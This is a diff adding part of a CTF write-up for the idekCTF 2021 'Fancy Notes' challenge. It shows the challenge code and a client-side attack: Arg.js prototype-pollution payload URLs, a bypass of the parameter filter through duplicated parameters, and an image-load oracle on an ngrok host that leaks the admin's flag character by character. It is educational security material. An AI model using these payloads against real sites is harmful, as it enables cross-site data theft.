@@ -665,7 +665,7 @@ There is also a Report feature, the classic send link to authenticated admin (bo
 
 The source code is bigger than Steghide as a Service, so let's go to the important parts.
 
-The complete source-code is available in my [repo](https://github.com/Neptunians/idekctf-2021-writeups/tree/main/fancy-notes).
+The complete source-code is available in my [repo](https://github.com/Neptunians/idekctf-2021-writeups/tree/main/fancy-notes/src/challenge).
 
 ```python=9
 flag = open('flag.txt', 'r').read()
@@ -731,10 +731,185 @@ def fancify():
     * The **q** parameter is the part of content that you search
     * Any paramether other than **q** must have only 1 char
     * If you passed all filters, render **fancy.html** Jinja template
+    * Use the **notes** to render the first note found in the search. If nothing found, it goes empty.
 
 
+This (like many other CTF and real world scenarios currently) demands your analisys of client-side security.
 
-### Hack
+Let's take a look a [fancy.html](https://github.com/Neptunians/idekctf-2021-writeups/blob/main/fancy-notes/src/challenge/templates/fancy.html).
+
+```htmlembedded=
+{% extends "layout.html" %}
+{% block title %}fancify your notes!{% endblock %}
+{% block body %}
+<script src="https://raw.githack.com/stretchr/arg.js/master/dist/arg-1.4.js"></script>
+<center>
+	<section class="section">
+		<div class="container">
+			<h1 class="title">make your notes fancy!</h1>
+		{%if message %}
+		<ul class=flashes>
+		<label><strong>{{message}}</strong></label></ul></br>
+		{% endif %}
+		{% if note %}
+		<div class="animation" id="note">
+		<p id="title">{{note[0]}}</p>
+		<p id="content">{{note[1]}}</p>
+		<style id='style'></style>
+	</br>
+</div>
+		{% else %}
+		<p>search for a note by title or content to make it <i>𝒻𝒶𝓃𝒸𝓎</i>!</p>
+		<form action='/fancy' method='GET' align='center'>
+        <p><input name='q' style='text-align: center;' type='text' placeholder='enter a search query' /></p>
+        <p><label for="style">select a style!</label></p>
+       		<select id="style" name="style"><option value="0">0</option><option value="1">1</option><option value="2">2</option><option value="3">3</option><option value="4">4</option><option value="5">5</option></select>
+        <p><input value='search' style='text-align: center;' type='submit' /></p>
+        </form>
+        {% endif %}
+    </div>
+</section>
+</center>
+<script src='/static/js/styles.js'></script>
+<script src='/static/js/fancify.js'></script>
+{% endblock %}
+```
+* **Summary**
+    * Uses Arg.js to parse the URL (we'll see it later)
+    * If there are notes, show the notes and the happy cowboy face image (keep the smiley face in your heart for now)
+    * If there aren't notes, show the empty form (and do not show the smiley face image).
+    * There are two javascript files loaded in the end: [styles.js](https://github.com/Neptunians/idekctf-2021-writeups/blob/main/fancy-notes/src/challenge/static/js/styles.js) and [fancify.js](https://github.com/Neptunians/idekctf-2021-writeups/blob/main/fancy-notes/src/challenge/static/js/fancify.js).
+
+In the challenge I've lost some time on **styles.js**. It was suspicious, but not useful.
+For brevity purposes, we'll focus on **fancify.js**:
+
+
+```javascript=
+function fancify(note) {
+	color = (args.style || Math.floor(Math.random() * 6)).toString();
+	image = this.image || '/static/images/success.png';
+	styleElement = note.children[2];
+	styleElement.innerHTML = style; // i have no idea why i did this in such a scuffed way but I'm too lazy to change it. no this is not vulnerable
+	note.className = `animation${color}`;
+	img = new Image();
+	img.src = image
+	note.append(img);
+}
+
+args = Arg.parse(location.search);
+noteElement = document.getElementById('note');
+
+if(noteElement){
+	fancify(noteElement);
+}
+```
+* **Summary**
+    * Parses the URL string into parameters, using [Arg.js](https://github.com/stretchr/arg.js/).
+    * Chooses the style based on the **style** query string parameter. I've lost time enough here without success. Let's move on :)
+    * If there is an image attribute, on window object, get the URL for the image there. 
+        * If it is not set, get a constant **success.png**, which is our ~~(hated)~~ loved cowboy happy face. 
+        * It doesn't make sense for functional purposes, so it must be related to the solution.
+        * If we can set the image, we may inject some evil payload here.
+    * Sets the image address to the image selected in the above.
+
+### Hacktion plan
+
+The insight here started (for me) in the middle: I can inject something in the image URL, somehow.
+
+At first, I thought about injecting some SVG with a Javascript, to fetch the note with the flag, but being a cross-domain javascript, I would most probably be blocked.
+
+If I just insert an image in my controlled server, **I know the image is being loaded**. But how does it help me getting the flag?
+
+The answer is in the **fancy.html** template. If some note is found in the search with the **q** parameter of the **/fancy** route, it loads the image. Otherwise, it does not load it.
+Let's put it into examples to make it easier to understand.
+
+Let's suppose:
+* We can control the image URL string.
+    * Let's say our URL is: my_owned_url/image.jpg
+    * Let's say I control the URL through the invented parameter "image".
+* We are authenticated as admin
+
+What we already know:
+* The flag is a note, owned by Admin
+* The flag format is idek{([!-z])+}
+* If we search flag for "idek{" on /fancy, it will load the cowboy happy face image.
+    * Example: http://fancy-notes.chal.idek.team/fancy?q=idek{+1&style=2&image=my_owned_url/image.jpg
+* If we search flag for "abc", it won't find any note and will not load the image.
+    * Example: http://fancy-notes.chal.idek.team/fancy?q=abc+1&style=2&image=my_owned_url/image.jpg
+* If we search flag for "idek{a", it well load the cowboy happy face only if the first character of the flag is "a".
+    * Example: http://fancy-notes.chal.idek.team/fancy?q=idek{a&style=2&image=my_owned_url/image.jpg
+
+In this way, we can test each character after "{", to validate the first char of the flag. If the char is correct, it will try loading my image in my_owned_url/image.jpg. 
+
+**Brute-force char-by-char!**
+
+But so far, we can't control the image parameter.
+
+I got stuck here until the organizers released a hint for us to look for prototype pollution and even gave a URL to look for: https://github.com/BlackFan/client-side-prototype-pollution.
+1 hour later, [Alisson](https://fireshellsecurity.team/infektion/), from our team, got this insight without knowing about the released hint.
+
+We found a prorotype pollution on arg.js and the example vulnerable code was exactly the code in fancy.html + fancify.js: https://github.com/BlackFan/client-side-prototype-pollution/blob/master/pp/arg-js.md
+
+We could inject values using URL values like:
+
+```
+?__proto__[test]=test
+?__proto__.test=test
+?constructor[prototype][test]=test
+#__proto__[test]=test
+```
+
+The hash option didn't work for me, but it confirmed I could inject in the image value with this URL, testing locally:
+
+```
+http://localhost:1337/fancy?q=idek{&style=3&__proto__[image]=1
+```
+
+In this case, the "image" variable is injected (in this.image) and the image URL is "1". Of course, it doesn't show anything because it is not a valid image address.
+
+But we still have a problem: the only parameter allowed to have any number of characters is **q**. Any other parameter is filtered to have only 1 character (This is why I tested with "1").
+This filter happens in the /fancy route.
+
+If we can set the image the our controlled URL, we can brute-force the flag (char-by-char).
+
+It took me some time here to find the solution. 
+
+The parsing of the parameters is duplicated:
+1. On the Python server app, it uses request.args.items() to get the parameters.
+2. On the client-side, fancify.js, it uses Arg.js.
+
+If we can find a way that these 2 parsings behave differently, we could bypass the filter.
+After testing many possibilities, I got this working payload:
+
+```
+http://localhost:1337/fancy?q=idek{&style=3&__proto__[image]=1&__proto__[image]=my_controlled_url
+```
+
+Since the proto parameter is duplicated, it turns out, the Flask **request.args.items()** gets the 1st parameters as valid and the **Arg.js** uses the last. And we have our bypass :)
+
+Now, to prove our concept, let's make two reports to the Admin.
+
+For this, let's start ngrok to receive the page loads: http://78b5-201-17-126-102.ngrok.io.
+
+1. Let's test if it loads our controlled URL image using the valid flag start (image1.jpg).
+
+```
+http://localhost:1337/fancy?q=idek{&style=3&__proto__[image]=1&__proto__[image]=http://78b5-201-17-126-102.ngrok.io/image1.jpg
+```
+
+2. Let's test if it do not load it our controlled URL image using an invalid flag start (image2.jpg).
+
+```
+http://localhost:1337/fancy?q=random&style=3&__proto__[image]=1&__proto__[image]=http://78b5-201-17-126-102.ngrok.io/image2.jpg
+```    
+
+As expected, we only got the load from the first report, because it contains a valid flag part **idek{**.
+
+![Fancy Report](https://i.imgur.com/EJSgbyE.png)
+
+Now we need to get our hands dirty to exploit our brute-force.
+
+### Exploiting
 
 ## References
 * CTF Time Event: https://ctftime.org/event/1512
